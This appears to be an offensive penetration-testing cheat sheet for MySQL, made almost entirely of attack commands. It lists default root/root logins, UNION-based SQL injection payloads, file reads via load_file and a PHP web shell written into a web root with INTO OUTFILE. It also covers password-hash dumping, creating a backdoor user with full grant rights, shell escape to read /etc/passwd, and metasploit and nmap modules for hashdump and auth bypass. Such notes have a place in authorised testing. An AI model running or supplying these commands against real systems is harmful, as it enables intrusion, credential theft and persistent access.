Always test the following:

Username: root

Password: root

### Connect string:
mysql --host=ip -u root -p

mysql -h <Hostname> -u root

mysql -h <Hostname> -u root@localhost

mysql -h <Hostname> -u ""@localhost

mysql -u root # Connect to root without password

mysql -u root -p # A password will be asked (check someone)

mysql -u root -h 192.168.1.103 -p

### Connect string

Server=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword;

Server=serverAddress1, serverAddress2, serverAddress3;Database=myDataBase;Uid=myUsername;Pwd=myPassword;

telnet ip 3306

ERROR 1130 (HY000): Host 'ip' is not allowed to connect to this MySQL server

cat /etc/my.cnf

Escalating privileges

If mysql is started as root you might have a chance to use it as a way to escalate your privileges.

Connect string to database:

/var/www/html/configuration.php

<?php
class JConfig {
    var $mailfrom = 'admin@rainng.com';
    var $fromname = 'testuser';
    var $sendmail = '/usr/sbin/sendmail';
    var $password = 'myPassowrd1234';
    var $sitename = 'test';
    var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
    var $MetaKeys = 'joomla, Joomla';
    var $offline_message = 'This site is down for maintenance. Please check back again soon.';
    }
    



CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)

CONVERT(from_base64("aG9sYWFhCg=="), BINARY)

show databases;

use <database>;

show tables;

describe <table_name>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges

select user,file_priv from mysql.user where user='root'; #File privileges

select version(); #version

select @@version(); #version

select user(); #User

select database(); #database name

#Try to execute code

select do_system('id');
\! sh

### Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables

Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

### Read & Write
select load_file('/var/lib/mysql-files/key.txt'); #Read file

select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

### Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';

UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';

FLUSH PRIVILEGES;

quit;

mysql -u username -p < manycommands.sql #A file with all the commands you want to execute

cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"


### Privilege escalation:
How to:

Current Level of access

mysql>select user();

mysql>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';

Access passwords

mysql> use mysql

mysql> select user,password from user;

Create a new user and grant him privileges

mysql>create user test identified by 'test';

mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

Break into a shell

mysql> \! cat /etc/passwd
mysql> \! bash

### metasploit 
msf> use auxiliary/scanner/mysql/mysql_version

msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump

msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds

msf> use auxiliary/admin/mysql/mysql_enum #Creds

msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 

msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds

=====

windows/mysql/mysql_payload

U root

P 

### nmap nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <
IP
